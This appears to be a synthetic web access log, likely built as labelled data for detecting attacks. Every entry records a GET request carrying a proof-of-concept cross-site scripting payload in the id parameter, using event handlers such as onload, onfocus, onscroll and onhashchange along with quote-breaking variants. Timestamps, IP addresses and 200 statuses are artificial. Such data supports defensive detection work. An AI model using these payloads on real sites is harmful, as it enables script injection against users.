+ip: 95.222.107.82., user-identifier: UD34, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onhashchange=alert(1)><a href=#x>click this!#x&password=placeholder HTTP/1.0, status: 200
+ip: 190.56.149.77., user-identifier: UD125, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<keygen autofocus onfocus=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 19.157.75.103., user-identifier: UD66, name: satang, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<form onsubmit=alert(1)><input type=submit>&password=placeholder HTTP/1.0, status: 200
+ip: 18.217.247.19., user-identifier: UD87, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onscroll=alert(1)><br><br><br><br>&password=placeholder HTTP/1.0, status: 200
+ip: 187.225.206.138., user-identifier: UD12, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<video onloadstart=alert(1)><source>&password=placeholder HTTP/1.0, status: 200
+ip: 193.188.134.162., user-identifier: UD184, name: satang, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<menu id=x contextmenu=x onshow=alert(1)>right click me!&password=placeholder HTTP/1.0, status: 200
+ip: 205.159.231.122., user-identifier: UD121, name: frank, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onscroll=alert(1)><br><br><br><br>&password=placeholder HTTP/1.0, status: 200
+ip: 28.225.95.244., user-identifier: UD240, name: satang, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<select onchange=alert(1)><option>1<option>2&password=placeholder HTTP/1.0, status: 200
+ip: 146.126.250.254., user-identifier: UD213, name: guy, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<input autofocus onblur=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 47.218.59.175., user-identifier: UD199, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onresize=alert(1)>press F12!&password=placeholder HTTP/1.0, status: 200
+ip: 147.182.86.58., user-identifier: UD122, name: frank, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<keygen autofocus onfocus=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 158.201.176.94., user-identifier: UD89, name: satang, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onhashchange=alert(1)><a href=#x>click this!#x&password=placeholder HTTP/1.0, status: 200
+ip: 205.187.108.236., user-identifier: UD154, name: guy, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<marquee loop=1 width=0 onfinish=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 164.57.144.77., user-identifier: UD51, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<marquee onstart=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 200.40.239.125., user-identifier: UD155, name: frank, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id="onmouseover=alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 146.84.60.3., user-identifier: UD193, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<form onsubmit=alert(1)><input type=submit>&password=placeholder HTTP/1.0, status: 200
+ip: 161.241.108.56., user-identifier: UD18, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onscroll=alert(1)><br><br><br><br>&password=placeholder HTTP/1.0, status: 200
+ip: 247.101.181.200., user-identifier: UD210, name: leon, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id='-alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 15.112.38.96., user-identifier: UD12, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<marquee loop=1 width=0 onfinish=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 33.128.192.65., user-identifier: UD31, name: leon, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<keygen autofocus onfocus=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 247.8.116.84., user-identifier: UD128, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<menu id=x contextmenu=x onshow=alert(1)>right click me!&password=placeholder HTTP/1.0, status: 200
+ip: 67.111.115.153., user-identifier: UD141, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<input autofocus onblur=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 192.110.184.79., user-identifier: UD15, name: guy, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onscroll=alert(1)><br><br><br><br>&password=placeholder HTTP/1.0, status: 200
+ip: 89.36.50.82., user-identifier: UD5, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<svg onload=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 15.91.143.196., user-identifier: UD229, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id="autofocus/onfocus=alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 80.91.117.160., user-identifier: UD211, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onhashchange=alert(1)><a href=#x>click this!#x&password=placeholder HTTP/1.0, status: 200
+ip: 27.238.188.25., user-identifier: UD214, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onhelp=alert(1)>press F1! (MSIE)&password=placeholder HTTP/1.0, status: 200
+ip: 219.253.90.128., user-identifier: UD200, name: satang, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<audio src onloadstart=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 20.171.186.61., user-identifier: UD57, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id='-alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 175.128.193.165., user-identifier: UD246, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id='-alert(1)-'&password=placeholder HTTP/1.0, status: 200
+ip: 114.21.180.123., user-identifier: UD64, name: satang, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onhelp=alert(1)>press F1! (MSIE)&password=placeholder HTTP/1.0, status: 200
+ip: 22.164.9.34., user-identifier: UD214, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<marquee onstart=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 225.115.101.206., user-identifier: UD250, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<video onloadstart=alert(1)><source>&password=placeholder HTTP/1.0, status: 200
+ip: 155.56.191.253., user-identifier: UD128, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onresize=alert(1)>press F12!&password=placeholder HTTP/1.0, status: 200
+ip: 233.13.253.29., user-identifier: UD18, name: guy, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<marquee onstart=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 128.200.236.42., user-identifier: UD22, name: frank, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onresize=alert(1)>press F12!&password=placeholder HTTP/1.0, status: 200
+ip: 107.169.58.102., user-identifier: UD117, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id='-alert(1)-'&password=placeholder HTTP/1.0, status: 200
+ip: 138.7.113.186., user-identifier: UD171, name: frank, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id="onmouseover=alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 205.237.57.142., user-identifier: UD218, name: guy, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id='-alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 134.63.51.145., user-identifier: UD92, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id='-alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 169.5.48.83., user-identifier: UD66, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<keygen autofocus onfocus=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 6.158.185.131., user-identifier: UD62, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<menu id=x contextmenu=x onshow=alert(1)>right click me!&password=placeholder HTTP/1.0, status: 200
+ip: 22.122.57.243., user-identifier: UD155, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<select onchange=alert(1)><option>1<option>2&password=placeholder HTTP/1.0, status: 200
+ip: 55.94.210.40., user-identifier: UD199, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id='-alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 210.167.16.102., user-identifier: UD220, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id='-alert(1)-'&password=placeholder HTTP/1.0, status: 200
+ip: 113.157.238.77., user-identifier: UD128, name: satang, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<keygen autofocus onfocus=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 107.87.104.168., user-identifier: UD185, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id='-alert(1)-'&password=placeholder HTTP/1.0, status: 200
+ip: 82.125.237.156., user-identifier: UD2, name: leon, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x&password=placeholder HTTP/1.0, status: 200
+ip: 179.13.86.202., user-identifier: UD43, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id='-alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 198.121.141.168., user-identifier: UD204, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onscroll=alert(1)><br><br><br><br>&password=placeholder HTTP/1.0, status: 200
+ip: 229.46.154.217., user-identifier: UD24, name: frank, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onhelp=alert(1)>press F1! (MSIE)&password=placeholder HTTP/1.0, status: 200
+ip: 151.160.48.239., user-identifier: UD163, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id="onmouseover=alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 8.154.55.69., user-identifier: UD109, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<marquee onstart=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 59.113.237.10., user-identifier: UD89, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id="><svg onload=alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 27.136.243.67., user-identifier: UD174, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<marquee loop=1 width=0 onfinish=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 227.237.209.159., user-identifier: UD112, name: satang, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onfocus=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 239.209.146.91., user-identifier: UD212, name: satang, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<menu id=x contextmenu=x onshow=alert(1)>right click me!&password=placeholder HTTP/1.0, status: 200
+ip: 87.232.229.117., user-identifier: UD165, name: guy, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id="autofocus/onfocus=alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 241.238.119.165., user-identifier: UD210, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<audio src onloadstart=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 236.250.124.222., user-identifier: UD146, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onhashchange=alert(1)><a href=#x>click this!#x&password=placeholder HTTP/1.0, status: 200
+ip: 149.194.26.218., user-identifier: UD115, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onresize=alert(1)>press F12!&password=placeholder HTTP/1.0, status: 200
+ip: 6.131.143.73., user-identifier: UD195, name: frank, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<marquee onstart=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 186.13.83.101., user-identifier: UD69, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<form onsubmit=alert(1)><input type=submit>&password=placeholder HTTP/1.0, status: 200
+ip: 15.251.255.53., user-identifier: UD226, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id="autofocus/onfocus=alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 157.150.204.249., user-identifier: UD158, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id="><svg onload=alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 80.70.156.249., user-identifier: UD220, name: guy, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onhelp=alert(1)>press F1! (MSIE)&password=placeholder HTTP/1.0, status: 200
+ip: 100.230.0.128., user-identifier: UD78, name: satang, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<menu id=x contextmenu=x onshow=alert(1)>right click me!&password=placeholder HTTP/1.0, status: 200
+ip: 136.198.75.167., user-identifier: UD87, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onhashchange=alert(1)><a href=#x>click this!#x&password=placeholder HTTP/1.0, status: 200
+ip: 39.106.101.103., user-identifier: UD233, name: leon, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<audio src onloadstart=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 108.186.208.151., user-identifier: UD166, name: guy, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<input autofocus onblur=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 208.218.88.9., user-identifier: UD221, name: guy, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<input autofocus onblur=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 240.195.53.7., user-identifier: UD196, name: frank, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<svg onload=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 76.181.4.103., user-identifier: UD245, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<select onchange=alert(1)><option>1<option>2&password=placeholder HTTP/1.0, status: 200
+ip: 220.172.125.3., user-identifier: UD74, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<form onsubmit=alert(1)><input type=submit>&password=placeholder HTTP/1.0, status: 200
+ip: 107.144.221.196., user-identifier: UD71, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<keygen autofocus onfocus=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 106.189.254.237., user-identifier: UD44, name: guy, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id='-alert(1)-'&password=placeholder HTTP/1.0, status: 200
+ip: 64.224.80.220., user-identifier: UD231, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onfocus=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 99.18.80.150., user-identifier: UD51, name: frank, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<marquee loop=1 width=0 onfinish=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 163.2.4.201., user-identifier: UD123, name: frank, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<video onloadstart=alert(1)><source>&password=placeholder HTTP/1.0, status: 200
+ip: 96.237.195.232., user-identifier: UD181, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<form onsubmit=alert(1)><input type=submit>&password=placeholder HTTP/1.0, status: 200
+ip: 7.188.52.11., user-identifier: UD140, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<select onchange=alert(1)><option>1<option>2&password=placeholder HTTP/1.0, status: 200
+ip: 126.135.224.236., user-identifier: UD20, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onhelp=alert(1)>press F1! (MSIE)&password=placeholder HTTP/1.0, status: 200
+ip: 93.135.236.87., user-identifier: UD31, name: satang, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x&password=placeholder HTTP/1.0, status: 200
+ip: 201.221.18.17., user-identifier: UD48, name: leon, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id='-alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 202.111.205.184., user-identifier: UD178, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<audio src onloadstart=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 48.219.165.91., user-identifier: UD250, name: frank, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id='-alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 251.61.33.249., user-identifier: UD157, name: satang, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id="><svg onload=alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 173.226.223.53., user-identifier: UD215, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<menu id=x contextmenu=x onshow=alert(1)>right click me!&password=placeholder HTTP/1.0, status: 200
+ip: 161.142.140.105., user-identifier: UD42, name: guy, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<menu id=x contextmenu=x onshow=alert(1)>right click me!&password=placeholder HTTP/1.0, status: 200
+ip: 90.60.203.103., user-identifier: UD196, name: satang, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<marquee loop=1 width=0 onfinish=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 254.106.130.212., user-identifier: UD48, name: satang, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id="onmouseover=alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 92.105.189.179., user-identifier: UD230, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<form onsubmit=alert(1)><input type=submit>&password=placeholder HTTP/1.0, status: 200
+ip: 31.221.240.81., user-identifier: UD166, name: satang, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<marquee onstart=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 238.71.38.120., user-identifier: UD245, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onhelp=alert(1)>press F1! (MSIE)&password=placeholder HTTP/1.0, status: 200
+ip: 214.83.46.233., user-identifier: UD12, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onhashchange=alert(1)><a href=#x>click this!#x&password=placeholder HTTP/1.0, status: 200
+ip: 207.242.247.33., user-identifier: UD139, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<select onchange=alert(1)><option>1<option>2&password=placeholder HTTP/1.0, status: 200
+ip: 174.141.22.176., user-identifier: UD164, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id="onmouseover=alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 216.125.142.18., user-identifier: UD31, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<svg onload=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 46.247.68.119., user-identifier: UD91, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onhashchange=alert(1)><a href=#x>click this!#x&password=placeholder HTTP/1.0, status: 200
+ip: 189.174.33.37., user-identifier: UD100, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onhelp=alert(1)>press F1! (MSIE)&password=placeholder HTTP/1.0, status: 200
+ip: 126.217.163.187., user-identifier: UD206, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<keygen autofocus onfocus=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 70.47.26.106., user-identifier: UD67, name: leon, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<keygen autofocus onfocus=alert(1)>&password=placeholder HTTP/1.0, status: 200
